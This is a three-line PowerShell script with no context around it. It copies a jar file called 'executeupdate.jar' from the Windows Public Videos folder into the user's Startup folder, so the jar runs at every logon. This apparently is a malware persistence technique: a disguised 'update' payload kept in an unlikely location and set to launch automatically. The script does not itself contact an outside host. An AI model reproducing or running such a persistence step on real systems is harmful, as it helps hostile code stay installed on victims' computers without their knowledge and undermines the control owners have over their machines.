$sourceFile = "C:\Users\Public\Videos\executeupdate.jar"
$destinationFolder = [Environment]::GetFolderPath("Startup")

Copy-Item -Path $sourceFile -Destination $destinationFolder
